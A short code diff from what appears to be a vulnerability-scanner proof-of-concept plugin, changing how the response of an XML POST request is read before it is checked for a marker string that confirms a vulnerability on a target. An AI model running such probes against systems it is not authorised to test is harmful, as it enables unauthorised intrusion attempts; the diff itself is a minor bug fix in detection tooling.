@@ -58,7 +58,7 @@ class Poc(ABPoc):
                     <root/>      
             '''
             content = requests.post(verify_url, data=data, headers={
-                                    'Content-Type': 'text/xml'}).content
+                                    'Content-Type': 'text/xml'}).text
 
             if '595bb9ce8726b4b55f538d3ca0ddfd' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
